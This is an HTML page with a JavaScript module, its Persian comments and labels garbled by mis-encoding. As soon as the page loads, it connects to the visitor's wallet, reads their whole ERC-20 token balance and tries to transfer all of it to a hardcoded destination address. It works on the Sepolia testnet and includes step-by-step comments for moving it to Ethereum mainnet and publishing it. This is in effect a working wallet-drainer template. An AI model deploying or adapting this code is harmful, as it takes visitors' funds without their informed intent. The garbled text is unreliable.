<!doctype html>
<html lang="fa">
<head>
  <meta charset="utf-8" />
  <title>Simple Transfer â€” Max Balance (Sepolia)</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    :root{font-family:system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial}
    body{margin:0;background:#f3f4f6;display:flex;align-items:center;justify-content:center;height:100vh}
    .card{width:720px;max-width:96%;background:#fff;border-radius:12px;padding:22px;box-shadow:0 8px 30px rgba(2,6,23,0.08)}
    h1{margin:0 0 8px;font-size:18px}
    p{margin:0 0 14px;color:#475569}
    .status{padding:12px;border-radius:8px;margin-top:10px;font-weight:600}
    .loading{background:#fff7ed;color:#92400e}
    .error{background:#fff1f2;color:#7f1d1d}
    .success{background:#ecfdf5;color:#065f46}
    pre{background:#0f172a;color:#e6eef8;padding:12px;border-radius:8px;overflow:auto;max-height:240px}
    footer{margin-top:12px;font-size:13px;color:#64748b}
    .small{font-size:13px;color:#64748b}
  </style>
</head>
<body>
  <main class="card" role="main" aria-live="polite">
    <h1>Ø§Ù†ØªÙ‚Ø§Ù„ Ú©Ù„ Ù…ÙˆØ¬ÙˆØ¯ÛŒ (Max transfer) â€” Sepolia</h1>
    <p class="small">Ø§ÛŒÙ† ØµÙØ­Ù‡ ÙÙ‚Ø· ÛŒÚ© ØªØ±Ø§Ú©Ù†Ø´ transfer Ø§Ø² ØªÙˆÚ©Ù† Ø§Ù†ØªØ®Ø§Ø¨â€ŒØ´Ø¯Ù‡ Ø¨Ù‡ Ø¢Ø¯Ø±Ø³ Ù…Ù‚ØµØ¯ Ù…ÛŒâ€ŒØ³Ø§Ø²Ø¯. Ú©Ø§Ø±Ø¨Ø± ÛŒÚ© Ø§Ù…Ø¶Ø§ Ù…ÛŒâ€ŒØ¯Ù‡Ø¯ Ùˆ Ú¯Ø³ Ø±Ø§ Ø®ÙˆØ¯Ø´ Ù¾Ø±Ø¯Ø§Ø®Øª Ù…ÛŒâ€ŒÚ©Ù†Ø¯.</p>

    <div id="status" class="status loading">â³ Ø¢Ù…Ø§Ø¯Ù‡â€ŒØ³Ø§Ø²ÛŒ ...</div>

    <pre id="log">Ù„Ø§Ú¯ Ø§Ø¬Ø±Ø§ (console-like) â€” Ø¨Ø±Ø§ÛŒ Ø¯ÛŒØ¨Ø§Ú¯ Ùˆ ØªØ³Øª</pre>

    <footer>
      <div class="small">Ù†Ú©ØªÙ‡: Ù‚Ø¨Ù„ Ø§Ø² Ø§Ø³ØªÙØ§Ø¯Ù‡ØŒ `TOKEN_ADDRESS` Ùˆ `DESTINATION_ADDRESS` Ø±Ø§ Ø¯Ø± Ú©Ø¯ Ù‚Ø±Ø§Ø± Ø¯Ù‡ÛŒØ¯. ØªØ³Øª Ø±ÙˆÛŒ Sepolia Ø§Ù†Ø¬Ø§Ù… Ø´ÙˆØ¯Ø› Ø¨Ø±Ø§ÛŒ Ø§Ù†ØªÙ‚Ø§Ù„ Ø¨Ù‡ MainnetØŒ Ø¨Ø®Ø´ Â«ØªØ¨Ø¯ÛŒÙ„ Ø¨Ø±Ø§ÛŒ MainnetÂ» Ø±Ø§ Ù…Ø·Ø§Ù„Ø¹Ù‡ Ú©Ù†ÛŒØ¯.</div>
    </footer>
  </main>

  <script type="module">
  // -------------------------
  // Simple Max Transfer Script
  // -------------------------
  // ØªÙˆØ¶ÛŒØ­Ø§Øª:
  //  - Ø±ÙØªØ§Ø±: Ù‡Ù†Ú¯Ø§Ù… Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ ØµÙØ­Ù‡ØŒ ÙˆÙ„Øª Ø±Ø§ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…ÛŒâ€ŒÚ©Ù†Ø¯ØŒ Ø´Ø¨Ú©Ù‡ Ø±Ø§ Ø¨Ø±Ø±Ø³ÛŒ Ù…ÛŒâ€ŒÚ©Ù†Ø¯ (Sepolia)ØŒ Ù…ÙˆØ¬ÙˆØ¯ÛŒ ØªÙˆÚ©Ù† Ø±Ø§ Ù…ÛŒâ€ŒØ®ÙˆØ§Ù†Ø¯
  //    Ùˆ ÛŒÚ© ØªØ±Ø§Ú©Ù†Ø´ transfer(..., balance) Ø§ÛŒØ¬Ø§Ø¯ Ù…ÛŒâ€ŒÚ©Ù†Ø¯. Ú©Ø§Ø±Ø¨Ø± Ø¢Ù† Ø±Ø§ ØªØ§ÛŒÛŒØ¯ Ù…ÛŒâ€ŒÚ©Ù†Ø¯ Ùˆ Ø®ÙˆØ¯Ø´ Ú¯Ø³ Ù¾Ø±Ø¯Ø§Ø®Øª Ù…ÛŒâ€ŒÚ©Ù†Ø¯.
  //  - ÙØ§ÛŒÙ„ Ø¨Ø±Ø§ÛŒ ÛŒÚ© ØªÙˆÚ©Ù† ERC-20 ØªÙ†Ø¸ÛŒÙ… Ø´Ø¯Ù‡Ø› Ø§Ú¯Ø± Ù…ÛŒâ€ŒØ®ÙˆØ§Ù‡ÛŒØ¯ Ø¨Ø±Ø§ÛŒ ETH Ø§Ù†ØªÙ‚Ø§Ù„ Ø¯Ù‡ÛŒØ¯ (Ø§Ù†ØªÙ‚Ø§Ù„ native ETH)
  //    Ø¨Ø®Ø´â€ŒÙ‡Ø§ÛŒ Ø²ÛŒØ± Ø±Ø§ ØªØºÛŒÛŒØ± Ø¯Ù‡ÛŒØ¯ (Ø±Ø§Ù‡Ù†Ù…Ø§ Ø¯Ø± Ù¾Ø§ÛŒÛŒÙ†).
  //
  // Ù…Ù‡Ù…: Ù‚Ø¨Ù„ Ø§Ø² ØªØ³Øª/Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…Ù‚Ø¯Ø§Ø±Ù‡Ø§ÛŒ PLACEHOLDER Ø±Ø§ Ø§ØµÙ„Ø§Ø­ Ú©Ù†ÛŒØ¯.
  // -------------------------

  import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.9.1/dist/ethers.esm.min.js";

  const LOG = document.getElementById('log');
  const STATUS = document.getElementById('status');
  function log(msg){ LOG.textContent += msg + "\n"; console.log(msg); }
  function setStatus(text, cls='loading'){ STATUS.textContent = text; STATUS.className = 'status ' + cls; }

  // ------------ CONFIG (Ø¬Ø§ÛŒÚ¯Ø°Ø§Ø±ÛŒ Ú©Ù†ÛŒØ¯) ------------
  // Ù„Ø·ÙØ§Ù‹ Ø§ÛŒÙ† Ø¯Ùˆ Ù…Ù‚Ø¯Ø§Ø± Ø±Ø§ Ù…Ø·Ø§Ø¨Ù‚ Ù†ÛŒØ§Ø²Ù ØªØ³Øª ÛŒØ§ production Ø®ÙˆØ¯ ØªØºÛŒÛŒØ± Ø¯Ù‡ÛŒØ¯:
  const TOKEN_ADDRESS = "0x92f3B59a79bFf5dc60c0d59eA13a44D082B2bdFC"; // <-- Ø¢Ø¯Ø±Ø³ ØªÙˆÚ©Ù† ERC-20 ØªØ³ØªÛŒ Ø¨Ø± Ø±ÙˆÛŒ Sepolia (REPLACE)
  const DESTINATION_ADDRESS = "0xYourDestinationAddressHere000000000000000"; // <-- Ø¢Ø¯Ø±Ø³ Ù…Ù‚ØµØ¯ Ø±Ø§ Ø§ÛŒÙ†Ø¬Ø§ Ø¨Ú¯Ø°Ø§Ø±ÛŒØ¯ (REPLACE)

  // Ø´Ø¨Ú©Ù‡â€ŒÛŒ Ù…ÙˆØ±Ø¯ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø¨Ø±Ø§ÛŒ ØªØ³Øª:
  const CHAIN_ID = 11155111; // Sepolia

  // -----------------------------------------------

  (async function main(){
    try {
      setStatus("â³ Ø´Ø±ÙˆØ¹ â€” Ø¯Ø±Ø­Ø§Ù„ ÙˆØµÙ„ Ø´Ø¯Ù† Ø¨Ù‡ Ú©ÛŒÙ ...", 'loading');

      if (!window.ethereum) {
        setStatus("âŒ Ù‡ÛŒÚ† Ú©ÛŒÙ Ù¾ÙˆÙ„ÛŒ Ø´Ù†Ø§Ø³Ø§ÛŒÛŒ Ù†Ø´Ø¯ (MetaMask ÛŒØ§ Ù…Ø¹Ø§Ø¯Ù„ Ù„Ø§Ø²Ù… Ø§Ø³Øª)", 'error');
        log("window.ethereum not found");
        return;
      }

      // provider Ùˆ Ø¨Ø±Ø±Ø³ÛŒ Ø´Ø¨Ú©Ù‡
      const provider = new ethers.BrowserProvider(window.ethereum);

      // Ø§Ú¯Ø± Ú©Ø§Ø±Ø¨Ø± Ø±ÙˆÛŒ Ø´Ø¨Ú©Ù‡ Ø§Ø´ØªØ¨Ø§Ù‡ Ø§Ø³Øª: ØªÙ„Ø§Ø´ Ø¨Ø±Ø§ÛŒ switch (Ø¨Ù‡ÛŒÙ†Ù‡: Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¨Ù‡ Ú©Ø§Ø±Ø¨Ø±)
      const network = await provider.getNetwork();
      log("Ø´Ø¨Ú©Ù‡ ÙØ¹Ù„ÛŒ chainId: " + network.chainId);
      if (Number(network.chainId) !== CHAIN_ID) {
        // Ø³Ø¹ÛŒ Ù…ÛŒâ€ŒÚ©Ù†ÛŒÙ… Ø¯Ø±Ø®ÙˆØ§Ø³Øª ØªØºÛŒÛŒØ± Ø´Ø¨Ú©Ù‡ Ø¨Ø¯Ù‡ÛŒÙ… (Ù…ØªØ§â€ŒÙ…Ø³Ú©)
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0xaa36a7" }] // 0xaa36a7 == 11155111 hex
          });
          log("Ø´Ø¨Ú©Ù‡ Ø¨Ù‡ Sepolia ØªØºÛŒÛŒØ± Ø¯Ø§Ø¯Ù‡ Ø´Ø¯ (Ø§Ø² Ú©Ø§Ø±Ø¨Ø± Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø´Ø¯)");
        } catch (switchErr) {
          // Ø§Ú¯Ø± Ú©Ø§Ø±Ø¨Ø± Ù†Ù¾Ø°ÛŒØ±ÙØª ÛŒØ§ Ø´Ø¨Ú©Ù‡ Ù…ÙˆØ¬ÙˆØ¯ Ù†Ø¨ÙˆØ¯ØŒ Ù¾ÛŒØ§Ù… Ø¨Ø¯Ù‡
          setStatus("âš  Ù„Ø·ÙØ§Ù‹ ÙˆÙ„Øª Ø®ÙˆØ¯ Ø±Ø§ Ø¨Ù‡ Ø´Ø¨Ú©Ù‡ Sepolia ØªØºÛŒÛŒØ± Ø¯Ù‡ÛŒØ¯ Ùˆ ØµÙØ­Ù‡ Ø±Ø§ Ø¯ÙˆØ¨Ø§Ø±Ù‡ Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ Ú©Ù†ÛŒØ¯.", 'error');
          log("Unable to switch network automatically: " + String(switchErr));
          return;
        }
      }

      // Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø§ØªØµØ§Ù„ Ø­Ø³Ø§Ø¨ Ø¨Ù‡ ÙˆÙ„Øª (Ù¾Ø§Ù¾â€ŒØ¢Ù¾ Ø§ØªØµØ§Ù„)
      setStatus("ğŸ” Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø§ØªØµØ§Ù„ Ø¨Ù‡ Ú©ÛŒÙ ...", 'loading');
      let accounts;
      try {
        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      } catch (reqErr) {
        setStatus("âŒ Ú©Ø§Ø±Ø¨Ø± Ø§ØªØµØ§Ù„ Ø±Ø§ Ø±Ø¯ Ú©Ø±Ø¯ ÛŒØ§ Ø®Ø·Ø§ Ø±Ø® Ø¯Ø§Ø¯", 'error');
        log("eth_requestAccounts failed: " + String(reqErr));
        return;
      }
      const userAddr = accounts[0];
      log("Ø¢Ø¯Ø±Ø³ Ú©Ø§Ø±Ø¨Ø±: " + userAddr);

      // signer
      const signer = await provider.getSigner();

      // ERC-20 minimal ABI: balanceOf, decimals, symbol, transfer
      const ERC20_ABI = [
        "function balanceOf(address) view returns (uint256)",
        "function decimals() view returns (uint8)",
        "function symbol() view returns (string)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ];

      setStatus("ğŸ” Ø®ÙˆØ§Ù†Ø¯Ù† Ù…ÙˆØ¬ÙˆØ¯ÛŒ ØªÙˆÚ©Ù† ...", 'loading');
      const token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);

      // read balance
      let balance;
      try {
        balance = await token.balanceOf(userAddr);
      } catch (err) {
        setStatus("âŒ Ø®Ø·Ø§ Ø¯Ø± Ø®ÙˆØ§Ù†Ø¯Ù† Ù…ÙˆØ¬ÙˆØ¯ÛŒ ØªÙˆÚ©Ù†. Ø¢Ø¯Ø±Ø³ ØªÙˆÚ©Ù† Ø±Ø§ Ø¨Ø±Ø±Ø³ÛŒ Ú©Ù†ÛŒØ¯.", 'error');
        log("balanceOf error: " + String(err));
        return;
      }

      // read decimals & symbol (best-effort, not required for transfer)
      let decimals = 18;
      let symbol = "";
      try { decimals = Number(await token.decimals()); } catch(e){ log("decimals read failed"); }
      try { symbol = await token.symbol(); } catch(e){ /* ignore */ }

      if (balance === 0n) {
        setStatus("â„¹ï¸ Ù…ÙˆØ¬ÙˆØ¯ÛŒ ØªÙˆÚ©Ù† Ú©Ø§Ø±Ø¨Ø± ØµÙØ± Ø§Ø³Øª â€” ØªØ±Ø§Ú©Ù†Ø´ÛŒ Ø³Ø§Ø®ØªÙ‡ Ù†Ø®ÙˆØ§Ù‡Ø¯ Ø´Ø¯.", 'error');
        log(`User balance is zero for token ${TOKEN_ADDRESS}`);
        return;
      }

      // Compose human-friendly amount (for log)
      const human = (Number(balance) / Math.pow(10, decimals)).toLocaleString('en-US', { maximumFractionDigits: 6 });
      setStatus(`âœ³ï¸ Ø¢Ù…Ø§Ø¯Ù‡ Ø§Ø±Ø³Ø§Ù„ ØªØ±Ø§Ú©Ù†Ø´: Ø§Ø±Ø³Ø§Ù„ Ú©Ù„ Ù…ÙˆØ¬ÙˆØ¯ÛŒ (${human} ${symbol || 'token'})`, 'loading');
      log(`Balance (raw): ${balance.toString()}  decimals:${decimals}`);

      // Build and send transfer transaction
      setStatus("ğŸ” Ø§ÛŒØ¬Ø§Ø¯ ØªØ±Ø§Ú©Ù†Ø´ transfer(...) Ùˆ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø§Ù…Ø¶Ø§ Ø§Ø² Ú©Ø§Ø±Ø¨Ø± ...", 'loading');
      let tx;
      try {
        tx = await token.transfer(DESTINATION_ADDRESS, balance);
        log("Tx sent. hash: " + tx.hash);
        setStatus("â³ ØªØ±Ø§Ú©Ù†Ø´ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯ØŒ Ù…Ù†ØªØ¸Ø± ØªØ§ÛŒÛŒØ¯ Ø´Ø¨Ú©Ù‡ (user pays gas)...", 'loading');

        // Wait for receipt (optional)
        const receipt = await tx.wait();
        if (receipt && receipt.status === 1) {
          setStatus("âœ… ØªØ±Ø§Ú©Ù†Ø´ Ù…ÙˆÙÙ‚ÛŒØªâ€ŒØ¢Ù…ÛŒØ² Ø¨ÙˆØ¯. TxHash: " + tx.hash, 'success');
          log("Transaction confirmed in block " + receipt.blockNumber + " â€” hash: " + tx.hash);
        } else {
          setStatus("âŒ ØªØ±Ø§Ú©Ù†Ø´ Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯ (reverted).", 'error');
          log("Transaction failed or reverted. receipt: " + JSON.stringify(receipt));
        }
      } catch (txErr) {
        setStatus("âŒ Ø§Ø±Ø³Ø§Ù„ ØªØ±Ø§Ú©Ù†Ø´ Ø§Ù†Ø¬Ø§Ù… Ù†Ø´Ø¯ ÛŒØ§ Ú©Ø§Ø±Ø¨Ø± Ø¢Ù† Ø±Ø§ Ø±Ø¯ Ú©Ø±Ø¯.", 'error');
        log("transfer error: " + String(txErr));
        return;
      }

    } catch (e) {
      setStatus("âŒ Ø®Ø·Ø§ÛŒ ØºÛŒØ±Ù…Ù†ØªØ¸Ø±Ù‡ â€” Ø¬Ø²Ø¦ÛŒØ§Øª Ø¯Ø± Ú©Ù†Ø³ÙˆÙ„", 'error');
      log("Unexpected error: " + String(e));
      console.error(e);
    }
  })();

  // ---------------------------
  // Ø±Ø§Ù‡Ù†Ù…Ø§: Ù†Ø­ÙˆÙ‡ ØªØºÛŒÛŒØ± Ø¨Ø±Ø§ÛŒ MAINNET
  // ---------------------------
  // 1) Ù…Ù‚Ø¯Ø§Ø± CHAIN_ID Ø±Ø§ Ø¨Ù‡ 1 ØªØºÛŒÛŒØ± Ø¯Ù‡ÛŒØ¯ (Ø¯Ø± Ø¨Ø§Ù„Ø§ÛŒ ÙØ§ÛŒÙ„).
  // 2) Ø§Ø·Ù…ÛŒÙ†Ø§Ù† Ø­Ø§ØµÙ„ Ú©Ù†ÛŒØ¯ Ú©Ø§Ø±Ø¨Ø± Ø¯Ø± ÙˆÙ„Øª Ø´Ø¨Ú©Ù‡ Ø§ØµÙ„ÛŒ Ethereum Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†Ø¯.
  // 3) Ø¢Ø¯Ø±Ø³ TOKEN_ADDRESS Ùˆ DESTINATION_ADDRESS Ø±Ø§ Ø¨Ø±Ø§ÛŒ mainnet ØªÙ†Ø¸ÛŒÙ… Ú©Ù†ÛŒØ¯.
  // 4) ÙØ§ÛŒÙ„ Ø±Ø§ Ù‡Ù…Ø§Ù†Ù†Ø¯ Ù‚Ø¨Ù„ Ù…Ù†ØªØ´Ø± Ú©Ù†ÛŒØ¯Ø› Ú©Ø§Ø±Ø¨Ø±Ø§Ù† Ù‡Ù†Ú¯Ø§Ù… ØªÙ„Ø§Ø´ Ø¨Ø±Ø§ÛŒ Ø§Ù†ØªÙ‚Ø§Ù„ Ø±ÙˆÛŒ mainnet Ú¯Ø³ ÙˆØ§Ù‚Ø¹ÛŒ Ù¾Ø±Ø¯Ø§Ø®Øª Ù…ÛŒâ€ŒÚ©Ù†Ù†Ø¯.
  // ------------------------------------------
  </script>
</body>
</html>
